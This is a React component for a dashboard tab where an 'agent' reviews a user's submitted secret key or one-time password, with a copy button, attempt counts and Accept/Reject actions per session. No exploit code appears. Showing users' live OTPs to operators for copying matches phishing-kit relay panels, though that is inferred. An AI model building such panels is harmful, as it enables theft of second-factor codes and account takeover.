"use client"

import React from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Separator } from "@/components/ui/separator"
import { AlertCircle, Check } from "lucide-react"
import { CopyButton } from "@/components/common/CopyButton"
import { StageActions } from "./StageActions"

interface SecretKeyData {
  secret_key?: string
  verified_at?: string
  verified_by?: string
  attempts_used?: number
  attempts_total?: number
}

interface CurrentSubmission {
  stage: string
  data?: Record<string, any>
}

interface SecretKeyTabProps {
  secretKey?: SecretKeyData | null
  currentSubmission?: CurrentSubmission | null
  stage: string
  sessionId?: string
  onActionComplete?: () => void
}

export function SecretKeyTab({
  secretKey,
  currentSubmission,
  stage,
  sessionId,
  onActionComplete,
}: SecretKeyTabProps) {
  const isVerified = !!secretKey?.verified_at

  // Single unified status variable (eliminates multiple render paths)
  const secretKeyStatus = React.useMemo(() => {
    if (isVerified) return "verified"

    if (currentSubmission?.stage === "secret_key" &&
        currentSubmission?.data &&
        Object.keys(currentSubmission.data).length > 0 &&
        currentSubmission.data.secret_key) {
      return "pending"
    }

    return "awaiting"
  }, [isVerified, currentSubmission])

  const attemptsRemaining = secretKey
    ? (secretKey.attempts_total || 3) - (secretKey.attempts_used || 0)
    : 0
  const isOutOfAttempts = attemptsRemaining <= 0

  // Debug logging (simplified)
  React.useEffect(() => {
    console.log('SecretKeyTab Debug:', {
      secretKeyStatus,
      stage,
      hasData: !!currentSubmission?.data
    })
  }, [secretKeyStatus, stage, currentSubmission?.data])

  // Single return with conditional content (prevents unmount/remount flashing)
  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center justify-between">
            <span>Secret Key / OTP Verification</span>
            {secretKeyStatus === "verified" && (
              <Badge variant="outline" className="bg-green-500/20 text-green-400 border-green-500/30">
                <Check className="w-3 h-3 mr-1" />
                Verified
              </Badge>
            )}
            {secretKeyStatus === "pending" && (
              <Badge variant="outline" className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30">
                Pending Review
              </Badge>
            )}
            {secretKeyStatus === "awaiting" && (
              <Badge variant="outline" className="bg-gray-500/20 text-gray-400 border-gray-500/30">
                Awaiting User
              </Badge>
            )}
          </CardTitle>
          <CardDescription>
            {secretKeyStatus === "pending" && "User has submitted their secret key awaiting agent review"}
            {secretKeyStatus === "verified" && "User verification using secret key or one-time password"}
            {secretKeyStatus === "awaiting" && "User provided secret key or one-time password for verification"}
          </CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          {/* Pending submission section */}
          {secretKeyStatus === "pending" && (
            <>
              <div>
                <label className="text-sm font-medium text-muted-foreground">Secret Key / Code</label>
                <div className="mt-2 p-3 bg-muted rounded-md border flex items-center justify-between">
                  <p className="font-mono text-sm tracking-widest flex-1">{currentSubmission?.data?.secret_key || "N/A"}</p>
                  {currentSubmission?.data?.secret_key && <CopyButton value={currentSubmission.data.secret_key} label="Secret Key" />}
                </div>
              </div>

              <Separator />

              <Alert className="border-yellow-500/50 bg-yellow-500/5">
                <AlertCircle className="h-4 w-4 text-yellow-600" />
                <AlertDescription className="text-yellow-800">
                  User has submitted their secret key. Review above and use Accept/Reject buttons to proceed.
                </AlertDescription>
              </Alert>

              <Separator />

              {sessionId && (
                <StageActions
                  sessionId={sessionId}
                  stage={stage}
                  onActionComplete={onActionComplete}
                  variant="inline"
                />
              )}
            </>
          )}

          {/* Verified section */}
          {secretKeyStatus === "verified" && (
            <>
              <div>
                <label className="text-sm font-medium text-muted-foreground">Secret Key / Code</label>
                <div className="mt-2 p-3 bg-muted rounded-md border flex items-center justify-between">
                  <p className="font-mono text-sm tracking-widest flex-1">{secretKey?.secret_key || "N/A"}</p>
                  {secretKey?.secret_key && <CopyButton value={secretKey.secret_key} label="Secret Key" />}
                </div>
              </div>

              <Separator />

              {/* Attempts Display */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-muted-foreground">Verification Attempts</label>
                <div className="flex items-center gap-3">
                  <div className="flex-1">
                    <div className="w-full bg-muted rounded-full h-2">
                      <div
                        className={`h-2 rounded-full transition-all ${
                          isOutOfAttempts
                            ? "bg-red-500"
                            : attemptsRemaining <= 1
                              ? "bg-yellow-500"
                              : "bg-green-500"
                        }`}
                        style={{
                          width: `${((secretKey?.attempts_total || 3) - (secretKey?.attempts_used || 0)) / (secretKey?.attempts_total || 3) * 100}%`,
                        }}
                      />
                    </div>
                  </div>
                  <span className="text-sm font-medium min-w-fit">
                    {secretKey?.attempts_used || 0} / {secretKey?.attempts_total || 3}
                  </span>
                </div>
                <p className="text-xs text-muted-foreground">
                  {attemptsRemaining > 0
                    ? `${attemptsRemaining} attempt${attemptsRemaining !== 1 ? "s" : ""} remaining`
                    : "No attempts remaining"}
                </p>
              </div>

              <Separator />

              {/* Verification Info */}
              <div className="space-y-4 p-3 bg-green-500/5 border border-green-500/20 rounded-lg">
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Verified By</label>
                  <p className="text-sm mt-1 font-semibold">{secretKey?.verified_by || "System"}</p>
                </div>

                <div>
                  <label className="text-sm font-medium text-muted-foreground">Verified At</label>
                  <p className="text-sm mt-1">
                    {secretKey?.verified_at
                      ? new Date(secretKey.verified_at).toLocaleDateString("en-US", {
                          month: "short",
                          day: "numeric",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit",
                        })
                      : "N/A"}
                  </p>
                </div>
              </div>
            </>
          )}

          {/* Awaiting user section */}
          {secretKeyStatus === "awaiting" && (
            <Alert>
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>No secret key data available yet. User has not entered their verification code.</AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
